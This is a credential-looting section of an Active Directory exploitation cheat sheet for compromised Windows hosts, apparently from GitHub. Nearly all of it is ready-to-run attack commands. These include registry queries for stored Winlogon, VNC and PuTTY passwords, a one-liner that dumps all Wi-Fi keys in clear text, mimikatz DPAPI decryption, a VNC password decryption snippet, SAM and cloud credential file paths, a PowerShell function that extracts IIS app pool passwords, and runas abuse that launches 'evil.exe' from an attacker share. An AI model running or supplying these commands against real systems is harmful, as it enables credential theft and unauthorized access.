## LOOTING

---
#### TOOL
- WinPEAS
- Lazagne
- SessionGopher

---
#### SEARCH A FILE
```powershell
cd c:/
# LIST FILE / RECURSE / INCLUDE HIDDEN
dir /b/s/a *.bat
dir /b/s/a *.xml
dir /b/s/a *.ps1
...

Get-ChildItem -Recurse -Force -Include *.rdp
Get-ChildItem -Recurse -Force -Include *.xml
Get-ChildItem -Recurse -Force -Include *putty*
Get-ChildItem -Recurse -Force -Include *wifi*
...
# Check the RecycleBin to look for credentials inside it
```

---
#### WINLOGON CREDENTIALS
```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#OTHER WAY
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

---
#### REGISTRY CREDENTIALS
```
reg query HKLM /f pass /t REG_SZ /s
```

---
#### CHECK TASKS
```
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v | select-string -pattern "exe"
```

---
#### LIST STORED CREDENTIALS
```powershell
# LIST
cmdkey /list
Currently stored credentials:
    Target: Domain:interactive=WORKGROUP\Administrator
    Type: Domain Password
    User: WORKGROUP\Administrator
# ABUSE WITH SMBSHARE
runas /savecred /user:WORKGROUP\Administrator "\\10.10.10.10\SHARE\evil.exe"
# ABUSE WITH COMMAND EXEC
runas /savecred /user:WORKGROUP\Administrator  "Powershell -EncodedCommand B64CMD"
```

---
#### DPAPI
```powershell
# DPAPI KEY
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
# MASTER PASSWORD
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
:information_source: You can use mimikatz module dpapi::masterkey with the appropiate arguments (/pvk or /rpc) to decrypt it.
:information_source: You can use mimikatz module dpapi::cred with the appropiate /masterkey to decrypt.

---
#### WIFI
```powershell
Get-ChildItem -Recurse -Force -Include *wifi*
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
```

---
#### BROWSER CREDS
```powershell
Mimikatz: dpapi::chrome
```
:information_source: sharpweb
- Google
- Chrome
- Mozilla
- Firefox
- Microsoft Internet Explorer/Edge

---
#### PUTTY CREDS
```powershell
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

---
#### PUTTY SSH HOST KEYS
```powershell
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

---
#### SSH KEYS IN REGISTRY
```powershell
reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
```

---
#### WINVNC3
```powershell
reg query "HKCU\Software\ORL\WinVNC3\Password"
```

---
#### SNMP
```powershell
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
```

---
#### TIGHTVNC
```powershell
reg query "HKCU\Software\TightVNC\Server"
#
Get-ItemProperty -Path  HKLM:\SOFTWARE\TightVNC\Server\ -Name Password
#
reg query HKLM\SOFTWARE\TightVNC\Server\ /v Password
```
#### DECRYPT
```
msf5 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

irb: warn: can't alias jobs from irb_jobs.
>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
>> require 'rex/proto/rfb'
=> true
>> Rex::Proto::RFB::Cipher.decrypt ["XXXXXXXXXXXXXXXX"].pack('H*'), fixedkey
=> "password"
```

---
#### OPENSSH
```powershell
reg query "HKCU\Software\OpenSSH\Agent\Key"
```


---
#### UNATTENDED FILES
```powershell
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
---
#### SAM & SYSTEM BACKUPS
```powershell
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
---
#### CLOUD CREDENTIALS
```powershell
##From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
---
#### CACHED GPP
```powershell
"C:\ProgramData\Microsoft\Group Policy\history"
"C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history" 

Groups.xml
Services.xml
Scheduledtasks.xml
DataSources.xml
Printers.xml
Drives.xml
```
:information_source: To decrypt these passwords you can decrypt it using
- gpp-decrypt xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx


---
#### IIS WEB CONFIG
```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

---
#### POSSIBLE FILENAMES CONTAINING CREDS
```powershell
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

---
#### SAVED RDP CONNECTIONS
```powershell
# REGISTRY
HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\
HKCU\Software\Microsoft\Terminal Server Client\Servers\
# LOCAL FILE
Get-ChildItem -Recurse -Force -Include *.rdp
get-content .\config.rdp
username:s:Administrator
password:s:xxxxxxxxxxxxx
```

---
#### RECENTLY RUN COMMANDS
```powershell
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

---
#### REMOTE DESKTOP CREDENTIAL MANAGER
```powershell
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
:information_source: Use the Mimikatz dpapi::rdg module with appropriate /masterkey to decrypt any .rdg files
You can extract many DPAPI masterkeys from memory with the Mimikatz sekurlsa::dpapi module

---
#### APPCMD
```powershell
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```
:information_source: AppCmd.exe is located in the %systemroot%\system32\inetsrv\ directory.
If this file exists then it is possible that some credentials have been configured and can be recovered.

---
#### SCCLIENT/SCCM
```powershell
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
:information_source: Check if C:\Windows\CCM\SCClient.exe exists .
Installers are run with SYSTEM privileges, many are vulnerable to DLL Sideloading (Info from https://github.com/enjoiz/Privesc).

[<- BACK TO MAIN MENU ->](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/README.md)
